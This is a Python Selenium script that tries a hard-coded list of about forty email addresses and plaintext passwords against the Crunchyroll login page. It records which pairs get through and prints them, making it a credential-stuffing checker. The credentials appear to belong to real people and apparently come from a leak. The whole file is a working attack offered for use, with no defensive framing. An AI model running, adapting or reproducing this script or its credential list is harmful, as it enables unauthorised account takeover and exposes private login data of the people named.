from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time

# === Credentials ===
credentials = [

    {"email": "alakbari0510@hotmail.com", "password": "Malakbari-12"},
    {"email": "zackbacker183@gmail.com", "password": "Mz565345"},
    {"email": "savagejaiden2@gmail.com", "password": "Twin_1234"},
    {"email": "viernasalime@gmail.com", "password": "Aubertali-"},
    {"email": "amirw0325@gmail.com", "password": "Tyhere.032503"},
    {"email": "ced.deschenes5@gmail.com", "password": "Kamekame59"},
    {"email": "cc54520@outlook.fr", "password": "Tonton54*"},
    {"email": "fariassfelipe13@gmail.com", "password": "Felipe07*"},
    {"email": "narutuzumaki9598@gmail.com", "password": "Bosch9595"},
    {"email": "reliquiasmoreira6@gmail.com", "password": "12151826"},
    {"email": "channelgodd@gmail.com", "password": "saiitoFps7"},
    {"email": "simonroshanoggi@gmail.com", "password": "cherry_27_02"},
    {"email": "menacyporra@gmail.com", "password": "miojinho123"},
    {"email": "kimhangtrungduc9999@gmail.com", "password": "ducnguyen"},
    {"email": "arvernieollier@gmail.com", "password": "motdepasse"},
    {"email": "jakob_kopkin@hotmail.de", "password": "Kopkin1997"},
    {"email": "fluffy.rhin@gmail.com", "password": "Cecefu117"},
    {"email": "afalison79@gmail.com", "password": "af102030"},
    {"email": "clariecheverria@yahoo.com", "password": "onepiece9"},
    {"email": "deepaknishad8721@gmail.com", "password": "6387127947"},
    {"email": "joaopedro12122002@gmail.com", "password": "Joaopedro-12"},
    {"email": "jg_717@hotmail.com", "password": "J7173659207g."},
    {"email": "ingridcaranqui15@gmail.com", "password": "ingridcaranqui15"},
    {"email": "jspossum01@gmail.com", "password": "GabeNano1314!"},
    {"email": "notjackmartin@outlook.com", "password": "DontChangeJacsPassword"},
    {"email": "rco_oliver@hotmail.com", "password": "172519"},
    {"email": "danielnag97@gmail.com", "password": "Danielnag1997"},
    {"email": "b.rareyess@gmail.com", "password": "tunin123webA"},
    {"email": "cute_mayun@hotmail.com", "password": "tuffer36"},
    {"email": "saag.01@hotmail.com", "password": "sergioa2g"},
    {"email": "kevin_perez1993@icloud.com", "password": "Chrispy38"},
    {"email": "nijcolecarvalho@icloud.com", "password": "Nicole@2004!"},
    {"email": "hu.go.cardenas25028122@gmail.com", "password": "mcgregorflow2200255"},
    {"email": "nekema6575@tirosoft.com", "password": "Niloy@7800"},
    {"email": "deaththedemond@gmail.com", "password": "Iron_Fox"},
    {"email": "nicobrucewayne1@gmail.com", "password": "leomessi10"},
    {"email": "josefabriciogomesbezerra0@gmail.com", "password": "Jose2009"},
    {"email": "Florianrock@hotmail.de", "password": "Florian99"},
    {"email": "emmett.k.kicks@gmail.com", "password": "Emmett8tank!"},
    {"email": "serviciosperuoficial+75@gmail.com", "password": "latin123"},
    {"email": "rcrjr1983@gmail.com", "password": "Kristi@n13"},
    {"email": "ladjaneborborema26@gmail.com", "password": "davi0101870155"},
    {"email": "crunch75dias@gmail.com", "password": "746312.herik"},
]


# === Setup ===
driver = webdriver.Chrome()
wait = WebDriverWait(driver, 15)
successful_logins = []
cookies_rejected = False

# === Process Each Credential in One Tab ===
for cred in credentials:
    driver.get("https://sso.crunchyroll.com/login")

    try:
        # === Reject Cookies (only once) ===
        if not cookies_rejected:
            try:
                reject_button = wait.until(EC.element_to_be_clickable((By.ID, "onetrust-reject-all-handler")))
                reject_button.click()
                print("Cookies rejected.")
                cookies_rejected = True
            except TimeoutException:
                print("Cookies already handled or button not found.")

        # === Enter Email ===
        email_field = wait.until(EC.presence_of_element_located((By.NAME, "login")))
        email_field.clear()
        email_field.send_keys(cred["email"])

        # === Wait for Next button to become enabled ===
        wait.until(lambda d: "button--is-disabled" not in d.find_element(By.CSS_SELECTOR, '[data-t="next-button"]').get_attribute("class"))

        # Click "Next"
        next_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-t="next-button"]')))
        next_button.click()

        # === Enter Password ===
        password_field = wait.until(EC.presence_of_element_located((By.NAME, "password")))
        password_field.clear()
        password_field.send_keys(cred["password"])

        # Save current URL before login
        url_before = driver.current_url

        # Click "Log In"
        login_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-t="login-button"]')))
        login_button.click()

        # Wait for redirect
        time.sleep(5)
        url_after = driver.current_url

        # === If redirected, save credentials ===
        if url_after != url_before:
            successful_logins.append(cred)

    except TimeoutException:
        pass  # Skip any failures silently


# === Print All Successful Logins ===
print("\n=== Successful Logins ===")
for success in successful_logins:
    print(f"{success['email']} | {success['password']}")

# === Done ===
driver.quit()